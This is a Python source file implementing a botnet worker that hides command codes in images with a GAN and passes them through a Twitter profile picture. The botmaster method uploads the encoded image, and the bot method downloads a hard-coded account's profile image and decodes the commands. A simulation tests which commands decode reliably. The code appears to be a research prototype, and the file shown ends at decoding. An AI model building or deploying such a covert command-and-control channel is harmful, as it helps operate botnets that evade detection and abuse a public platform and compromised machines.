import os
import collections

import cv2
import numpy as np
import tensorflow as tf
import wget
import tweepy

import worker_pool
import setting


class botnet_worker():
    def __init__(self) -> None:
        self.twitter_api = tweepy.API(tweepy.OAuth1UserHandler(
            setting.twitter_credential["api_key"], setting.twitter_credential["api_secret"],
            setting.twitter_credential["access_token"], setting.twitter_credential["access_token_secret"]
        ), wait_on_rate_limit=True)

    def botmaster_process(self, image_path, commands):
        img = np.array([worker_pool.dw.preprocess_image(image_path)])

        commands_bits = []
        for index in range(setting.num_message_channel):
            cmd = commands[index]
            cmd = worker_pool.cm.int_to_bits(cmd)
            cmd = np.tile(cmd, setting.command_repeat)
            cmd = np.pad(cmd, (0, setting.command_pad_width),
                         'constant', constant_values=0)
            cmd = tf.cast(cmd, tf.int64)
            commands_bits.append([cmd])

        output = (worker_pool.ganw.generator(
            img, commands_bits)[0] + 1) * 127.5

        output = cv2.cvtColor(np.array(output), cv2.COLOR_BGR2BGRA)
        output[:, :, 3] = 255
        output = cv2.copyMakeBorder(
            np.array(output), 1, 1, 1, 1, cv2.BORDER_CONSTANT, None, value=0)

        cv2.imwrite(setting.sample_encoded_image, output)

    def bot_process(self, image_path, channel_index, character_mapping=False):

        img = np.array([cv2.imread(image_path, cv2.IMREAD_COLOR)])
        img = img[:, 1:-1, 1:-1, :]
        img = img / 127.5 - 1

        cmd = worker_pool.ganw.decoders[channel_index](img)[0]
        cmd = tf.math.sigmoid(cmd)
        cmd = tf.math.round(cmd)
        cmd = np.array(cmd)
        cmd_voting = collections.defaultdict(int)
        for window_index in range(0, setting.command_repeat*setting.coding_window_size, setting.coding_window_size):
            c = worker_pool.cm.bits_to_int(
                cmd[window_index:window_index+setting.coding_window_size])
            if character_mapping:
                c = worker_pool.cm.int_matching(c)
            cmd_voting[c] += 1
        command = int(max(cmd_voting, key=cmd_voting.get))

        return command

    def voting_simulation(self, character_mapping=False, simulate_step=100000):
        if character_mapping:
            command_table = list(worker_pool.cm.mapping_table.keys())
        else:
            command_table = list(range(2**setting.coding_window_size))

        for vc in setting.vulnerable_command[character_mapping]:
            if vc in command_table:
                command_table.remove(vc)

        vul_cmd = set([])
        for _ in range(simulate_step):

            commands = np.random.choice(
                command_table, setting.num_message_channel)
            self.botmaster_process(setting.sample_image, commands)
            decoded_commands = []
            for channel_index in range(setting.num_message_channel):
                decoded_commands.append(self.bot_process(
                    setting.sample_encoded_image, channel_index, character_mapping))
            for index in range(setting.num_message_channel):
                if commands[index] != decoded_commands[index]:
                    vul_cmd.add(commands[index])
                    command_table.remove(commands[index])
        vul_cmd = list(vul_cmd)
        print("Weak command: ", vul_cmd)
        print("Weak command number: ", len(vul_cmd))
        print("Strong command: ", command_table)
        print("Strong command number: ", len(command_table))

    def update_twitter_profile_image(self, character_mapping=False):
        command_table = list(range(2**setting.coding_window_size))
        for vc in setting.vulnerable_command[character_mapping]:
            command_table.remove(vc)
        commands = np.random.choice(command_table, setting.num_message_channel)

        self.botmaster_process(setting.sample_image, commands)

        print(self.twitter_api.update_profile_image(
            filename=setting.sample_encoded_image))

    def decode_twitter_profile_image(self, character_mapping=False):

        master = self.twitter_api.get_user(screen_name="j935447281765")
        steg_image_url = master.profile_image_url_https.replace(
            "normal", "400x400")
        # steg_image_url = 'https://pbs.twimg.com/profile_images/1722739385093738496/OSqbL4wg_normal.png'.replace("normal", "400x400")

        if os.path.exists(setting.sample_downloaded_image):
            os.remove(setting.sample_downloaded_image)
        wget.download(steg_image_url, setting.sample_downloaded_image)
        print("/n")

        decoded_commands = []

        for channel_index in range(setting.num_message_channel):
            decoded_commands.append(self.bot_process(
                setting.sample_downloaded_image, channel_index, character_mapping))
